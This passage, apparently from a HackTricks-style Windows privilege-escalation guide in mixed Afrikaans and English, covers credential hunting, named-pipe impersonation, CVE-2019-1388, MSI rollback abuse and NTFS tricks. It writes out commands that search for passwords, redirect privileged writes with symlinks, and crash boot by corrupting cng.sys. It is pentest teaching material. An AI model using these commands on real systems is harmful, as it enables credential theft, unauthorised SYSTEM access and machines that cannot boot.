[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Jy moet vir dbs kyk waar wagwoorde van **Chrome or Firefox** gestoor word.\
Kyk ook na die geskiedenis, bladmerke en gunstelinge van die browsers—dalk is sommige **passwords are** daar gestoor.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie ingebou in die Windows-bedryfstelsel wat interkommunikasie tussen sagtewarekomponente in verskillende tale toelaat. Elke COM-komponent word **identified via a class ID (CLSID)** en elke komponent blootstel funksionaliteit via een of meer interfaces, geïdentifiseer via interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basies, as jy enige van die DLLs wat uitgevoer gaan word kan **overwrite**, kan jy **escalate privileges** as daardie DLL deur 'n ander gebruiker uitgevoer gaan word.

Om te leer hoe aanvallers COM Hijacking as 'n persistence-meganisme gebruik, kyk:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Soek na lêerinhoude**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n bepaalde lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register na sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin. Ek het hierdie plugin geskep om **outomaties elke metasploit POST module wat na credentials soek** binne die slagoffer uit te voer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende hulpmiddel om wagwoorde uit 'n stelsel te onttrek.

Die gereedskap [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **volle toegang**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae regte maar wat alle oop handles van die hoofproses erf**.\
Dan, as jy **volle toegang tot die lae-privilege proses** het, kan jy die **oop handle na die geprivilegieerde proses wat geskep is** met `OpenProcess()` gryp en **'n shellcode inject**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheue-segmente, verwys na as **pipes**, stel proses-kommunikasie en data-oordrag in staat.

Windows verskaf 'n funksie genaamd **Named Pipes**, wat toelaat dat ongekoppelde prosesse data deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur 'n buis gestuur word deur 'n **client**, het die **server** wat die buis opgestel het die vermoë om die **identiteit** van die **client** aan te neem, mits dit die nodige **SeImpersonate** regte het. Om 'n **privileged process** te identifiseer wat via 'n buis kommunikeer wat jy kan naboots, bied 'n geleentheid om **hoër regte** te verkry deur die identiteit van daardie proses aan te neem sodra dit met die deur jou opgestelde buis kommunikeer. Vir instruksies oor die uitvoering van so 'n aanval, vind nuttige gidse [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

Ook laat die volgende tool toe om **'n named pipe-kommunikasie te onderskep met 'n tool soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) in server-modus openbaar `\\pipe\\tapsrv` (MS-TRP). 'n Afgeleë geverifieerde kliënt kan die mailslot-gebaseerde async event-pad misbruik om `ClientAttach` in 'n arbitrêre **4-byte write** na enige bestaande lêer wat deur `NETWORK SERVICE` geskryf kan word te verander, dan Telephony admin regte verkry en 'n arbitrêre DLL as die diens laai. Volledige vloei:

- `ClientAttach` met `pszDomainUser` gestel na 'n skryfbare bestaande pad → die diens open dit via `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir async event writes.
- Elke gebeurtenis skryf die aanvaller-beheerde `InitContext` van `Initialize` na daardie handle. Registreer 'n line app met `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), haal dit op via `GetAsyncEvents` (`Req_Func 0`), en deregistreer/afsluit om deterministiese skryfbeweginge te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, herverbind, en roep dan `GetUIDllName` met 'n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` gestuur word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde skema) aktiveer en aanvallersbeheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **credentials op die command line deurgee**. Die skrip hieronder neem proses command lines elke twee sekondes vas en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Steel wagwoorde uit prosesse

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" te laat loop vanaf 'n onprivilegieerde gebruiker.

Dit maak dit moontlik om bevoegdhede op te skaal en UAC terselfdertyd met dieselfde kwesbaarheid te omseil. Daarbenewens is daar geen behoefte om enigiets te installeer nie en die binary wat tydens die proses gebruik word, is deur Microsoft gesigneer en uitgereik.

Sommige van die geaffekteerde stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwetsbaarheid uit te buiten, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Jy het al die nodige lêers en inligting in die volgende GitHub-repository:

https://github.com/jas502n/CVE-2019-1388

## Van Administrator Medium na High Integriteitsvlak / UAC Bypass

Lees dit om meer te leer oor **Integriteitsvlakke**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan ook dit om te leer oor **UAC en UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van ewekansige vouer verwyder/verplaas/hernoem na SYSTEM EoP

Die tegniek wat beskryf word [**in hierdie blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) met 'n exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van die Windows Installer se rollback-funksie om regmatige lêers met kwaadaardige te vervang tydens die deïnstallasieproses. Hiervoor moet die aanvaller 'n **kwaadaardige MSI installer** skep wat gebruik sal word om die `C:\Config.Msi` vouer te kap, wat later deur die Windows Installer gebruik sal word om rollback-lêers te stoor tydens die deïnstallasie van ander MSI-pakkette, waar die rollback-lêers gemodifiseer sou wees om die kwaadaardige payload te bevat.

Die opgesomde tegniek is soos volg:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Skep 'n `.msi` wat 'n onskadelike lêer (bv. `dummy.txt`) in 'n skryfbare vouer (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat 'n **non-admin user** dit kan uitvoer.
- Hou 'n **handle** oop na die lêer na die installasie.

- Step 2: Begin Uninstall
- Deïnstalleer dieselfde `.msi`.
- Die deïnstallasieproses begin lêers move na `C:\Config.Msi` en hernoem hulle na `.rbf` lêers (rollback backups).
- **Poll the open file handle** met `GetFinalPathNameByHandle` om te ontdek wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Step 3: Custom Syncing
- Die `.msi` sluit 'n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- Sein gee wanneer die `.rbf` geskryf is.
- Dan **wag** op 'n ander event voor dit voortgaan met die deïnstallasie.

- Step 4: Block Deletion of `.rbf`
- Wanneer gesignaleer, **open die `.rbf` lêer** sonder `FILE_SHARE_DELETE` — dit **voorkom dat dit verwyder word**.
- Dan **seine terug** sodat die deïnstallasie kan klaar maak.
- Windows Installer slaag nie daarin om die `.rbf` te verwyder nie, en omdat dit nie al die inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Step 5: Manually Delete `.rbf`
- Jy (aanvaller) verwyder die `.rbf` lêer handmatig.
- Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> Op hierdie punt, **trigger die SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te verwyder.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Skep die `C:\Config.Msi` vouer self weer.
- Stel **swak DACLs** in (bv. Everyone:F), en **hou 'n handle oop** met `WRITE_DAC`.

- Step 7: Run Another Install
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Skryfbare ligging.
- `ERROROUT`: 'n variabele wat 'n geforseerde fout veroorsaak.
- Hierdie installasie sal gebruik word om **rollback** weer te trigger, wat `.rbs` en `.rbf` sal lees.

- Step 8: Monitor for `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat 'n nuwe `.rbs` verskyn.
- Kap die sy naam op.

- Step 9: Sync Before Rollback
- Die `.msi` bevat 'n **custom install action (`SyncBeforeRollback`)** wat:
- 'n event seint wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Step 10: Reapply Weak ACL
- Nadat jy die `'.rbs created'` event ontvang het:
- Die Windows Installer **herstel sterk ACLs** op `C:\Config.Msi`.
- Maar aangesien jy nog 'n handle met `WRITE_DAC` het, kan jy weer **swak ACLs her-aanwend**.

> ACLs word **slegs by handle-open** afgedwing, so jy kan steeds na die vouer skryf.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Oorskryf die `.rbs` lêer met 'n **fake rollback script** wat Windows opdrag gee om:
- Jou `.rbf` lêer (kwaadaardige DLL) te herstel na 'n **bevoorregte ligging** (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou fake `.rbf` neer te sit wat 'n **kwaadaardige SYSTEM-level payload DLL** bevat.

- Step 12: Trigger the Rollback
- Seine die sync event sodat die installer voortgaan.
- 'n **type 19 custom action (`ErrorOut`)** is geconfigureer om die install doelbewus op 'n bekende punt te laat faal.
- Dit veroorsaak dat **rollback begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lees jou kwaadaardige `.rbs`.
- Kopieer jou `.rbf` DLL na die teikenvinding.
- Jy het nou jou **kwaadaardige DLL in 'n SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Voer 'n vertroude **auto-elevated binary** uit (bv. `osk.exe`) wat die DLL wat jy gehijack het laai.
- **Boom**: Jou kode word uitgevoer **as SYSTEM**.

### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die primêre MSI rollback-tegniek (hierbo) aanvaar dat jy 'n **gehele vouer** kan verwyder (bv. `C:\Config.Msi`). Maar wat as jou kwesbaarheid slegs **arbitrary file deletion** toelaat?

Jy kan NTFS-internals misbruik: elke vouer het 'n verborgen alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeksmetadata** van die map.

Dus, as jy **die `::$INDEX_ALLOCATION`-stroom verwyder** van 'n map, sal NTFS **die hele map** uit die lêerstelsel verwyder.

Jy kan dit doen met behulp van standaard lêerverwyderings-API's soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API aanroep, verwyder dit **die gids self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitief jou nie toelaat om arbitrêre lêers/gidse te verwyder nie, maar dit **laat wel die verwydering van die *inhoud* van 'n aanvaller-beheerde gids toe**?

1. Stap 1: Stel 'n lokgids en lêer op
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pauzeer uitvoering** wanneer 'n geprivilegieerde proses probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Roep die SYSTEM-proses op (bv., `SilentCleanup`)
- Hierdie proses deursoek vouers (bv., `%TEMP%`) en probeer hul inhoud verwyder.
- Wanneer dit by `file1.txt` kom, word die **oplock triggers** geaktiveer en beheer aan jou callback oorhandig.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Verskuif `file1.txt` elders
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moet nie `file1.txt` direk verwyder nie — dit sou die oplock voortydig vrylaat.

- Opsie B: Skakel `folder1` om in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit mik op die NTFS interne stroom wat vouermetadata stoor — deur dit te verwyder, verwyder jy die vouer.

5. Stap 5: Vrystel die oplock
- Die SYSTEM proses gaan voort en probeer `file1.txt` uitvee.
- Maar nou, weens die junction + symlink, verwyder dit eintlik:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanente DoS

Benut 'n primitief wat jou toelaat om **'n ewekansige gids as SYSTEM/admin te skep** — selfs al **kan jy nie lêers skryf** of **swak permissies instel**.

Skep 'n **gids** (nie 'n lêer nie) met die naam van 'n **kritieke Windows driver**, bv.:
```
C:\Windows\System32\cng.sys
```
- This path normally corresponds to the `cng.sys` kernel-mode driver.
- If you **pre-create it as a folder**, Windows fails to load the actual driver on boot.
- Then, Windows tries to load `cng.sys` during boot.
- It sees the folder, **fails to resolve the actual driver**, and **crashes or halts boot**.
- There’s **no fallback**, and **no recovery** without external intervention (e.g., boot repair or disk access).

### Van geprivilegieerde log-/backup-paaie + OM symlinks na ewekansige lêer-overskrywing / boot DoS

When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).

**Vereistes**
- Config storing the target path is writable by the attacker (e.g., `%ProgramData%\...\.ini`).
- Ability to create a mount point to `\RPC Control` and an OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- A privileged operation that writes to that path (log, export, report).

**Voorbeeldketen**
1. Read the config to recover the privileged log destination, e.g. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect the path without admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag dat die bevoorregte komponent die log skryf (bv. admin aktiveer "send test SMS"). Die skryf beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oor-skryfde teiken (hex/PE parser) om korrupsie te bevestig; herbegin dwing Windows om die gemanipuleerde driver-pad te laai → **boot loop DoS**. Dit generaliseer ook na enige beskermde lêer wat 'n bevoorregte service vir skryf sal oopmaak.

> `cng.sys` word gewoonlik gelaai vanaf `C:\Windows\System32\drivers\cng.sys`, maar as 'n kopie bestaan in `C:\Windows\System32\cng.sys` kan dit eers probeer word, wat dit 'n betroubare DoS-sink vir korrupte data maak.



## **Van High Integrity na System**

### **Nuwe service**

As jy reeds op 'n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees deur bloot **'n nuwe service te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig uitvoer, aangesien dit binne 20s gedood sal word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanuit 'n High Integrity-proses kan jy probeer om die AlwaysInstallElevated registry entries in te skakel en 'n reverse shell te installeer met 'n _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik vind jy dit reeds in 'n High Integrity-proses), sal jy byna enige proses kan **open** (nie protected processes nie) met die SeDebug privilege, die proses se **token kopieer**, en 'n **arbitrêre proses met daardie token** skep.\
Hierdie tegniek kies gewoonlik **'n proses wat as SYSTEM loop met al die token privileges** (_ja, jy kan SYSTEM-prosesse vind sonder al die token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om in `getsystem` op te skaal. Die tegniek bestaan uit die **skep van 'n pipe en dan die skep/misbruik van 'n service om op daardie pipe te skryf**. Dan sal die **server** wat die pipe geskep het, deur gebruik te maak van die **`SeImpersonate`** privilege, die **token van die pipe-klient (die service) kan impersonate** en SYSTEM-privileges verkry.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om **'n dll te hijack** wat deur 'n **proses** wat as **SYSTEM** loop, **geladen** word, sal jy arbitrêre kode met daardie regte kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie tipe privilege escalation, en verder is dit baie **makkelijker om te bereik vanaf 'n high integrity process** aangesien dit **write permissions** op die vouers het wat gebruik word om dlls te laad.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **Van Administrator of Network Service na System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Van LOCAL SERVICE of NETWORK SERVICE na volle regte

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nuttige gereedskap

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir miskonfigurasies en sensitiewe lêers (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike miskonfigurasies en versamel inligting (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir miskonfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstraheer PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP gestoor sessie-inligting. Gebruik -Thorough lokaal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Trek credentials uit Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS spoofer en man-in-the-middle hulpmiddel.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows-enumerasie**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek na bekende privesc kwesbaarhede (DEPRECATED vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale kontroles **(Benodig Admin regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwesbaarhede (moet saamgestel word met VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumariseer die gasheer om na miskonfigurasies te soek (meer 'n inligtingsversameling-instrument as privesc) (moet saamgestel word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Trek credentials uit baie sagteware (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kontroleer vir miskonfigurasies (uitvoerbare precompiled in github). Nie aanbeveel nie. Werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike miskonfigurasies (exe van python). Nie aanbeveel nie. Werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Gereedskap geskep gebaseer op hierdie pos (dit benodig nie accesschk om behoorlik te werk nie maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek compileer met die korrekte weergawe van .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-host te sien kan jy:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
